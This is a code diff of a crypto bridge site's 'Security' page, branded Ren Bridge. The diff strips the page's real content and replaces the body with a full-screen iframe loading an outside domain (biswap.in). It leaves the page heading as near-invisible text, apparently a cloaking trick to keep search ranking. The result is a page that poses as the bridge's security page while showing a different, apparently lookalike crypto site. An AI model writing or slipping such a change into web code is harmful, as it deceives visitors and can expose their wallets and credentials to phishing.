@@ -498,53 +498,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Ren Bridge">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Ren Bridge</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" class="active">Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Cryptographic Security & Smart Contract Safety</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Cryptographic Security & Smart Contract Safety</h1>
-    <p class="satellite-lead">Evaluating the custody models, smart contract audits, and oracle protection protocols of Ren Bridge.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Cryptographic Security & Smart Contract Safety
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>Security Auditing</h2>
-      <p>The security of cross-chain pools depends entirely on smart contract execution. Ren Bridge smart contracts undergo extensive security audits performed by leading Web3 security agencies to verify they are free of reentrancy vulnerabilities and lockup bugs, adhering to <a class="inline" href="https://www.nist.gov/" target="_blank" rel="noopener noreferrer">NIST cryptographic guidelines</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>Multi-Signature and sMPC Protection</h2>
-      <p>Rather than using a single hot wallet, the vaults are governed by multi-signature systems or secure <a class="inline" href="https://threshold.network/" target="_blank" rel="noopener noreferrer">Threshold Network sMPC</a> nodes. This divides cryptographic key generation across independent nodes, protecting deposits from malicious validators.</p>
-    </div>
-    <div class="section-block">
-      <h2>Proof of Reserves</h2>
-      <p>To ensure absolute solvency, the contract holdings are publicly verifiable on-chain. Users can check the explorer records at any time to verify that every wrapped token in circulation is backed 1:1 by locked assets in the vault, verified against custodian systems like <a class="inline" href="https://www.bitgo.com/" target="_blank" rel="noopener noreferrer">BitGo custody</a>.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Ren Bridge Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
